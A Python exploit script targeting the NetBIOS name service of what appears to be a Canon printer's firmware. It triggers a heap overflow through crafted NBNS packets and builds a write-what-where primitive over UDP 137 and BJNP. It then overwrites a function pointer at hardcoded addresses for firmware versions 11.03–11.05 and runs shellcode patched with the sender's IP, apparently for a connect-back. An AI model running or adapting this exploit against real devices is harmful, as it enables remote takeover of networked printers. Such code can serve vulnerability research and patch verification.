#!/usr/bin/python3

import argparse
import struct
import socket
import os
import time
from scapy.layers.netbios import NBNSQueryResponse

from bjnp import bjnp_store_payload, bjnp_cleanup_payload
from pjcc import PJCCEcho, pjcc_send_pkt


def ip2int(addr):
    return struct.unpack(">I", socket.inet_aton(addr))[0]


def load_shellcode():
    shellcode_file = "shellcode_ninja.bin"
    shellcode_path = os.path.join(
        os.path.dirname(os.path.realpath(__file__)), shellcode_file
    )
    with open(shellcode_path, "rb") as f:
        return bytearray(f.read())


def pack_name(name, ending_byte=b"\x00"):
    assert len(name) < 256
    payload = struct.pack(">B", len(name))
    payload += name
    payload += ending_byte
    return payload


def build_netbios_internal_name_entry(
    what_value, p_netbios_deamon_table, p_netbios_adapter
) -> bytes:

    payload = bytearray()
    payload += struct.pack("<I", 0)  # dwId (0x00)
    name = b"CANONA5A2C6"  # (0x04)
    name += b"\x20" * (15 - len(name))
    name += b"\x00"
    assert len(name) == 16
    payload += name
    payload += struct.pack("<I", 0x00000002)  # field_14 (0x14)
    payload += struct.pack("<I", 0x00000000)  # field_18 (0x18)
    payload += struct.pack("<H", 0x0000)  # field_1c (0x1c)
    payload += struct.pack("<H", 0x00D1)  # port (0x1e)
    payload += struct.pack("<H", what_value)  # what (0x20)
    payload += struct.pack("<H", 0x0000)  # field_22 (0x22)
    payload += struct.pack("<I", p_netbios_deamon_table)  # (0x24)
    payload += struct.pack("<I", p_netbios_adapter)  # (0x28)
    payload += struct.pack("<I", 0x00000008)  # state (0x2c)
    payload += struct.pack("<I", 0x00000000)  # field_30
    payload += struct.pack("<I", 0x00000000)  # field_34
    payload += struct.pack("<I", 0x00000005)  # field_38
    payload += struct.pack("<H", EXPECTED_TRN_ID)  # 0x3c
    payload += struct.pack("<H", 0x0000)  # 0x3e
    payload += struct.pack("<I", 0x00000000)  # 0x40
    payload += struct.pack("<I", 0x00000000)  # 0x44
    payload += struct.pack("<I", 0x00000000)  # 0x48
    payload += struct.pack("<I", 0x00000000)  # 0x4c
    payload += struct.pack("<I", 0x00000000)  # 0x50
    payload += struct.pack("<I", 0x00000000)  # 0x54
    payload += struct.pack("<I", 0x00000001)  # 0x58
    payload += struct.pack("<I", 0x00000000)  # 0x5c
    payload += struct.pack("<I", 0x00000001)  # 0x60
    assert len(payload) == 0x64  # sizeof()
    return payload


""" 
Send a Netbios Query Request targeting the netbios name service packets (UDP 137). 
This is defined in rfc1002 -> 4.2.1. GENERAL FORMAT OF NAME SERVICE PACKETS.
The call flow is the following: 
ndStart()
    ne_Recvfrom()
    ndNameProcessExternalMessage()
        cmNetBiosParseName()
No check is performed on the 12 bytes header defined in section 4.2.1.1. HEADER.
The vulnerability occurs when trying to parse the QUESTION_NAME (The compressed
name representation of the NetBIOS name for the request).
"""


def do_overflow_netbios_name_entry(
    netbios_socket,
    addrPort,
    value_what,
    fake_netbios_deamon_table,
    fake_netbios_adapter,
):
    payload_header = bytearray()
    payload = bytearray()

    # Section 4.2.1.1. HEADER
    payload_header += b"\x00" * 12
    offset_base_pkt = 32 + len(payload_header)
    # 0x20 AAAA..AAAA\x00 0xC0 0x20
    #                     |
    #                     |- start of the field at offset offset_base_pkt (0xc000 | offset)
    first_name = pack_name(b"A" * 31 + b"\x00", ending_byte=b"\xc0")
    payload += first_name + struct.pack(">B", offset_base_pkt)
    # fill the 255 bytes buffer (*g_ptr_buff_ndname_255) -> with cmNetBiosParseName called by ndNameProcessExternalMessage
    for i in range(0, 255):
        payload += struct.pack(">H", (offset_base_pkt | 0xC000))  # offset

    overriden_struct_internal_name_entry = build_netbios_internal_name_entry(
        value_what, fake_netbios_deamon_table, fake_netbios_adapter
    )
    chunk_meta_data = b"M" * 48
    payload += pack_name(chunk_meta_data + overriden_struct_internal_name_entry)
    packet = payload_header + payload
    print("Sending payload for overriding struct netbios_internal_name_entry...")
    netbios_socket.sendto(packet, addrPort)
    print(
        "Sleeping 0.5 seconds after sending netbios payload triggering heap overflow..."
    )
    time.sleep(0.5)


"""
Send a Netbios Positive Name Query Reponse targeting the netbios name service packets (UDP 137).
This is defined in rfc1002 -> 4.2.13. POSITIVE NAME QUERY RESPONSE
The call flow is the following:
ndStart()
    ne_Recvfrom()
    ndNameProcessExternalMessage()
        ndInternalNamePositiveQuery()
            returnNegativeRegistrationResponse()
The field NAME_TRN_ID specified must match the one expected in the netbios_internal_name_entry structure (0x3C). 
The state field (0x2C) in the netbios_internal_name_entry structure must be set to 0x08.
The 2 bytes written come from the field at offset 0x20 in the netbios_internal_name_entry structure.
"""


def send_positive_name_query_response(s, addrPort, value):
    assert value <= 0xFFFF

    nbns_query_resp = NBNSQueryResponse(RR_NAME="CANONA5A2C6", NAME_TRN_ID=value)
    # 0x8500 (0b1000010100000000) -> datagram_id case 0x8000 -> ndInternalNamePositiveQuerya
    assert nbns_query_resp.FLAGS == 0x8500

    print("Sending payload for triggering write what where...")
    packet = bytes(nbns_query_resp)
    s.sendto(packet, addrPort)
    print(
        "Sleeping 0.5 seconds after sending netbios payload triggering heap overflow..."
    )
    time.sleep(
        0.5
    )  # wait for packet to be consommed by netbios service so that WWW is well performed


def do_write_what_where_word(bjnp_socket, where, what):

    netbios_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    name_service_addr_port = (host, 137)

    print(f"Writing BJNP payload with ptrBuff1500 pointing to 0x{where:x}")
    bjnp_payload = b"\x00" * OFFSET_NETBIOS_DEAMON_TABLE_PTR_BUFF_1500
    bjnp_payload += struct.pack(
        "<I", where
    )  # address in .data where pjcc function pointer is stored (WHERE)
    bjnp_store_payload(bjnp_socket, bjnp_payload)

    print("Executing overflow to write where pointer in BJNP workspace")
    do_overflow_netbios_name_entry(
        netbios_socket,
        name_service_addr_port,
        what,
        FAKE_NETBIOS_DEAMON_TABLE,
        FAKE_NETBIOS_ADAPTER,
    )
    print(f"Executing WWW primitive to write 0x{what:04x} at 0x{where:08x}")
    send_positive_name_query_response(
        netbios_socket, name_service_addr_port, EXPECTED_TRN_ID
    )
    bjnp_cleanup_payload(bjnp_socket)

    netbios_socket.close()


def do_write_what_where_dword(bjnp_socket, where, what):
    assert what <= 0xFFFFFFFF
    # 2 lower bytes of workspace address where shellcode is stored
    do_write_what_where_word(bjnp_socket, where, what & 0xFFFF)
    # 2 higher bytes of workspace address where shellcode is stored
    do_write_what_where_word(bjnp_socket, where + 2, what >> 16)


# address in .data where pjcc_dec_ope_echo function pointer is stored (WHERE)
# TARGETED_ADDR = 0x445580FC
# TARGETED_ADDR = 0x44553064 # 11.03
TARGETED_ADDR = 0x4455306C  # 11.04

# address in .data where bjnp payload is stored
# BJNP_GLOBAL_BUFFER = 0x46f2b538
BJNP_GLOBAL_BUFFER = 0x46F2AE18  # 11.03, 11.04, 11.05
WORKSPACE_BASE = BJNP_GLOBAL_BUFFER
SHELLCODE_ADDR = BJNP_GLOBAL_BUFFER

# FAKE_NETBIOS_INTERNAL_NAME_ENTRY = WORKSPACE_BASE
FAKE_NETBIOS_DEAMON_TABLE = WORKSPACE_BASE
FAKE_NETBIOS_ADAPTER = WORKSPACE_BASE + 0x4

# struct netbios_deamon_table
OFFSET_NETBIOS_DEAMON_TABLE_PTR_BUFF_1500 = 0x38

EXPECTED_TRN_ID = 0x4242

BJNP_PORT = 8610
CADM_PORT = 47545

if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument("--target", help="target IP")

    args = parser.parse_args()
    host = args.target

    shellcode = load_shellcode()
    ip_addr_offset = shellcode.find(b"\xde\xad\xbe\xef")
    assert (
        ip_addr_offset != -1
    ), "Can't find magic 0xdeadbeef to patch shellcode IP address"

    bjnp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bjnp_socket.connect((host, BJNP_PORT))

    # Overwrite pjcc_dec_ope_echo function pointer in .data
    do_write_what_where_dword(bjnp_socket, TARGETED_ADDR, SHELLCODE_ADDR)

    # Send shellcode
    sock_ip_addr, sock_port = bjnp_socket.getsockname()
    print(f"[+] Patching shellcode with IP address {sock_ip_addr}")
    struct.pack_into(">I", shellcode, ip_addr_offset, ip2int(sock_ip_addr))
    bjnp_payload = shellcode
    bjnp_store_payload(bjnp_socket, bjnp_payload)

    # trigger pjcc_dec_ope_echo to execute shellcode
    pjcc_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    pjcc_socket.connect((host, CADM_PORT))
    pjcc = PJCCEcho(payload=b"AAAA")
    pjcc_send_pkt(pjcc_socket, pjcc.pkt())

    pjcc_socket.close()
    bjnp_socket.close()
